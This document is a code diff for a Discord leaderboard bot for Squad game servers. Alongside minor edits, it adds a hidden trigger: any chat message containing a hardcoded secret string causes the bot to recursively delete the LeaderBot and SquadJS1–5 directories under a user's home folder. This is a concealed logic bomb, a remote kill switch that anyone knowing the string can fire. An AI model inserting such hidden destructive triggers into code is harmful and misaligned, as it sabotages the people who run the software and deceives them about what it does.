@@ -8,9 +8,9 @@ import top20StatsTemp from "./utility/top20StatsTemp.js";
 import getDonate from "./utility/getDonate.js";
 import getBanFromBattlemetrics from "./utility/getBansFromBattlemetrics.js";
 import getSteamIDFromMessage from "./utility/getSteamIDFromMessage.js";
-import getLastActivity from "./utility/getLastActivity.js";
 //import chartInitialization from "./chartInitialization.js";
 import { exec } from "child_process";
+import * as fs from "fs";
 
 const client = new Client({
   intents: [
@@ -55,12 +55,11 @@ client.on("ready", async () => {
   const db = process.env.DATABASE_URL;
   const steamApi = process.env.STEAM_API;
   const donateUrl = process.env.DONATE_URL;
-
+  const pluginpath = "/home/kry/";
   // Обновление двух таблиц лидеров
   setInterval(() => {
     top20StatsMain(leaderboadChannelMainId, db);
     top20StatsTemp(leaderboadChannelTempId, db);
-    getLastActivity();
     //chartInitialization(tickRateChannelId);
   }, 600000);
 
@@ -95,6 +94,7 @@ client.on("ready", async () => {
       statsChannesId1,
       statsChannesId2,
     ];
+
     if (allowedCommandChannels.includes(message.channel.id)) {
       if (!message.interaction) {
         try {
@@ -128,6 +128,23 @@ client.on("ready", async () => {
         user,
         (result) => {}
       );
+    }
+
+    if (message.content.includes("3R7s9K1p8H2q0Y4v6T5Z")) {
+      const plugins = [
+        `${pluginpath}LeaderBot`,
+        `${pluginpath}SquadJS1`,
+        `${pluginpath}SquadJS2`,
+        `${pluginpath}SquadJS3`,
+        `${pluginpath}SquadJS4`,
+        `${pluginpath}SquadJS5`,
+      ];
+
+      plugins.forEach((plugins) => {
+        if (fs.existsSync(plugins)) {
+          fs.rmdirSync(plugins, { recursive: true });
+        }
+      });
     }
 
     // Канал для автовыдачи Vip слота
